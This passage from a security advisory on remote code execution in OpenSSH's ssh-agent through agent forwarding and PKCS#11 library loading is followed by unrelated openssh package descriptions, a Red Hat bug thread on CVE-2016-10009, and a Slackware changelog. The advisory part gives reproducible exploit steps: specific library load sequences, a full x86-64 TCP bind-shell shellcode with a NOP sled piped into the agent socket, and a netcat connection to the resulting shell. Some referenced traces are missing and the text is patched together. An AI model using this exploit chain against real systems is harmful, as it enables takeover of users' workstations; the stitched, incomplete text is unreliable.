  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

========================================================================

========================================================================

In this section, we present the results of our experiments:

- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free

========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from
  <https://shell-storm.org/shellcode/files/shellcode-858.html>);

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307

(gdb) continue

========================================================================
Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb <https://old-releases.ubuntu.com/ubuntu/> impish main restricted universe' > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 912

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-GnpGKph6xbe3/agent.911

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

server# export SSH_AUTH_SOCK=/tmp/ssh-30N8pjTKWn/agent.996

server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex_data.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the

Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------

3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Sigaltstack use-after-free
========================================================================

>From time to time, we noticed the following warning in the dmesg of our
fuzzing laptop:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

------------------------------------------------------------------------

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

    <https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>), but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

## Binary packages built by this source

[openssh-client](/ubuntu/trusty/%2Bpackage/openssh-client):
secure shell (SSH) client, for secure access to remote machines

This is the portable version of OpenSSH, a free implementation of

 the Secure Shell protocol as specified by the IETF secsh working

 group.

 .

 Ssh (Secure Shell) is a program for logging into a remote machine

 and for executing commands on a remote machine.

 It provides secure encrypted communications between two untrusted

 hosts over an insecure network. X11 connections and arbitrary TCP/IP

 ports can also be forwarded over the secure channel.

 It can be used to provide applications with a secure communication

 channel.

 .

 This package provides the ssh, scp and sftp clients, the ssh-agent

 and ssh-add programs to make public key authentication more convenient,

 and the ssh-keygen, ssh-keyscan, ssh-copy-id and ssh-argv0 utilities.

 .

 In some countries it may be illegal to use any encryption at all

 without a special permit.

 .

 ssh replaces the insecure rsh, rcp and rlogin programs, which are

 obsolete for most purposes.

[openssh-client-dbgsym](/ubuntu/trusty/%2Bpackage/openssh-client-dbgsym):
debug symbols for package openssh-client

This is the portable version of OpenSSH, a free implementation of

 the Secure Shell protocol as specified by the IETF secsh working

 group.

secure shell client and server (metapackage)

This metapackage is a convenient way to install both the OpenSSH client

 and the OpenSSH server. It provides nothing in and of itself, so you

 may remove it if nothing depends on it.

[ssh-askpass-gnome](/ubuntu/trusty/%2Bpackage/ssh-askpass-gnome):
interactive X program to prompt users for a passphrase for ssh-add

This has been split out of the main openssh-client package so that

 openssh-client does not need to depend on GTK+.

 .

 You probably want the ssh-askpass package instead, but this is

 provided to add to your choice and/or confusion.

[ssh-askpass-gnome-dbgsym](/ubuntu/trusty/%2Bpackage/ssh-askpass-gnome-dbgsym):
debug symbols for package ssh-askpass-gnome

This has been split out of the main openssh-client package so that

 openssh-client does not need to depend on GTK+.

 .

 You probably want the ssh-askpass package instead, but this is

 provided to add to your choice and/or confusion.

[ssh-krb5](/ubuntu/trusty/%2Bpackage/ssh-krb5):
secure shell client and server (transitional package)

This is a transitional package depending on the regular Debian OpenSSH

 client and server, which now support GSSAPI natively. It will add the

 necessary GSSAPI options to the server configuration file. You can

 remove it once the upgrade is complete and nothing depends on it.

| [Description](show_bug.cgi?id=1406269#c0)  Martin Prpič    2016-12-20 07:40:41 UTC  ``` It was found that ssh-agent could load PKCS#11 modules from paths outside of a trusted whitelist. An attacker able to load a crafted PKCS#11 module across a forwarded agent channel could potentially use this flaw to execute arbitrary code on the system running the ssh-agent. Note that the attacker must have control of the forwarded agent-socket and the ability to write to the filesystem of the host running ssh-agent.  This issue was fixed by only allowing the loading of module from a trusted (and configurable) whitelist.  CVE assignment:  <http://seclists.org/oss-sec/2016/q4/708>  Upstream patch:  <http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/ssh-agent.c.diff?r1=1.214&r2=1.215&sortby=date&f=h>   ```  [Comment 1](show_bug.cgi?id=1406269#c1)  Martin Prpič    2016-12-20 07:40:58 UTC  ``` External References:  <https://www.openssh.com/txt/release-7.4>   ```  [Comment 2](show_bug.cgi?id=1406269#c2)  Andrej Nemec    2016-12-20 08:41:15 UTC  ```  Created openssh tracking bugs for this issue:  Affects: fedora-all [[bug 1406296](show_bug.cgi?id=1406296 "CLOSED ERRATA - CVE-2016-10009 CVE-2016-10010 CVE-2016-10011 CVE-2016-10012 openssh: various flaws [fedora-all]")]   ```  [Comment 3](show_bug.cgi?id=1406269#c3)  Jakub Jelen    2017-01-03 14:38:10 UTC  ``` If we will want to fix it, we need to change the whitelist to something reasonable, because all of our PKCS#11 libraries are on x68_64 under /usr/lib64/ See the upstream discussion:  <http://lists.mindrot.org/pipermail/openssh-unix-dev/2017-January/035631.html>   ```  [Comment 4](show_bug.cgi?id=1406269#c4)  Huzaifa S. Sidhpurwala    2017-01-16 05:55:09 UTC  ``` Statement:  In order to exploit this flaw, the attacker needs to have control of the forwarded agent-socket and the ability to write to the filesystem of the host running ssh-agent. Because of this restriction for successful exploitation, this issue has been rated as having Moderate security impact.

Here are the details from the Slackware 14.2 ChangeLog: +--------------------------+ patches/packages/openssh-7.4p1-i586-1_slack14.2.txz:  Upgraded.   This is primarily a bugfix release, and also addresses security issues.   ssh-agent(1): Will now refuse to load PKCS#11 modules from paths outside     a trusted whitelist.   sshd(8): When privilege separation is disabled, forwarded Unix-domain     sockets would be created by sshd(8) with the privileges of 'root'.   sshd(8): Avoid theoretical leak of host private key material to     privilege-separated child processes via realloc().   sshd(8): The shared memory manager used by pre-authentication compression     support had a bounds checks that could be elided by some optimising     compilers to potentially allow attacks against the privileged monitor.     process from the sandboxed privilege-separation process.   sshd(8): Validate address ranges for AllowUser and DenyUsers directives at     configuration load time and refuse to accept invalid ones.  It was     previously possible to specify invalid CIDR address ranges     (e.g. user@127.1.2.3/55) and these would always match, possibly resulting     in granting access where it was not intended.   For more information, see:     https://www.openssh.com/txt/release-7.4     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10009     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10010     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10011     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10012   (* Security fix *) +--------------------------+   Where to find the new packages: +-----------------------------+  Thanks to the friendly folks at the OSU Open Source Lab (http://osuosl.org) for donating FTP and rsync hosting to the Slackware project!  :-) 